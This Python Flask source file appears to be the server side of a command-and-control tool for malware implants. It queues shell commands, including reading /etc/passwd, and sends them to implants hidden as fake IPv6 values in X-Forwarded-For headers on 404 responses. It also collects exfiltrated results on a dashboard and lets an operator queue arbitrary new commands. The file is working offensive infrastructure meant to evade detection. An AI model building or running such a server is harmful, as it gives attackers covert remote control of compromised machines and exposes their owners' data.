from flask import Flask, request, make_response
from helpers import wrap_dict, unwrap_dict, fake_ipv6, unfake_ipv6
import time
from rich import print
import uuid
import random

app = Flask(__name__)

DB = []
CMD_QUEUE = []
DEFAULT_CMDS = {
    1: "id",
    2: "date",
    3: "uname -a",
    4: "curl ifconfig.me",
    5: "cat /etc/passwd",
}

def log(obj):
    o = {'timestamp':time.time(), 'data':obj}
    # print(o)
    DB.append(o)

@app.get("/")
def index():
    return "index"

@app.get('/headers')
def fake_headers():

    try:
        cmd = CMD_QUEUE.pop(0)
    except BaseException:
        cmd = DEFAULT_CMDS[random.choice(range(1,6))]

    ret = {
        "timestamp": int(time.time()),
        "ep": 'headers',
        "shell_cmd":  cmd,
        "shorthaul_freq": 1,
        "jobid" : str(uuid.uuid4())

    }
    target_header = "X-Forwarded-For"
    resp = make_response('404 Not Found', 404)

    sent_data = request.headers.get(target_header)
    if sent_data != None:
        unwrapped = unwrap_dict(unfake_ipv6(sent_data))
        print(f'got http header', unwrapped)
        
        log(unwrapped)
        
        return resp
    
    resp.headers[target_header] = fake_ipv6(wrap_dict(ret))

    return resp

@app.get("/favicon.ico")
def favicon():
    return fake_headers()


@app.get("/ep<int:num>")
def endpoint(num):
    # if request is missing a type of header e.g. X-Forwarded-For
    # return dummy page
    # otherwise do this stuff

    try:
        cmd = CMD_QUEUE.pop(0)
    except BaseException:
        cmd = DEFAULT_CMDS[random.choice(range(1,5))]

        
    ret = {
        "timestamp": int(time.time()),
        "ep": num,
        "shell_cmd": cmd,
        "shorthaul_freq": 1,
        "jobid" : str(uuid.uuid4())

    }
    
    # resp = make_response(wrap_dict(ret))
    resp = wrap_dict(ret)
    return resp


@app.post("/ep<int:num>")
def catch(num):
    
    unwrapped = unwrap_dict(request.data)
    
    print("got http post", unwrapped)
    # c2_resp = C2Response(**unwrapped)
    # log(unwrapped)

    return "OK", 200


@app.get("/dashboard")
def dashboard():
    return f"{DB}"

@app.post("/new_cmd")
def new_cmd():
    cmd = request.form.get('cmd','')
    print(request.form.items())
    CMD_QUEUE.append(cmd)
    return f"queued command: {cmd} "

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=3000)
